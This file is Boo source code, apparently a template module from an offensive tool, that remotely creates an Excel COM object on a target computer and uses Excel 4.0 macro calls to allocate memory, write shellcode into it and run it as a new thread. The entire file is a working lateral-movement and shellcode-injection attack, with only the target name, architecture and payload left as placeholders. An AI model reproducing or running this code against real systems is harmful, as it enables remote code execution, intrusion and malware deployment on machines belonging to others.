import System
import System.Reflection

public static def Main():
    computername as string = "TARGET"
    officearch as string = "ARCH"

    try:
        ComType as Type = Type.GetTypeFromProgID('Excel.Application', computername)
        RemoteComObject as object = Activator.CreateInstance(ComType)

        lpAddress as int
        if officearch == "x64":
            lpAddress = 1342177280
        else:
            lpAddress = 0
        shellcode as (byte) = array(byte, (SHELLCODE))
        memaddr as duck = Convert.ToDouble(RemoteComObject.GetType().InvokeMember('ExecuteExcel4Macro', BindingFlags.InvokeMethod, null, RemoteComObject, array(object, ('CALL("Kernel32","VirtualAlloc","JJJJJ",' + lpAddress + ',' + shellcode.Length + ',4096,64)'))))
        count = 0
        for mybyte in shellcode:
            charbyte as string = String.Format('CHAR({0})', mybyte)
            ret as duck = RemoteComObject.GetType().InvokeMember('ExecuteExcel4Macro', BindingFlags.InvokeMethod, null, RemoteComObject, array(object, ('CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, ' + (memaddr + count) + ',' + charbyte + ', 1, 0)')))
            count = (count + 1)
        RemoteComObject.GetType().InvokeMember('ExecuteExcel4Macro', BindingFlags.InvokeMethod, null, RemoteComObject, array(object, ('CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, ' + memaddr + ', 0, 0, 0)')))
    except e as Exception:
        print "$e"
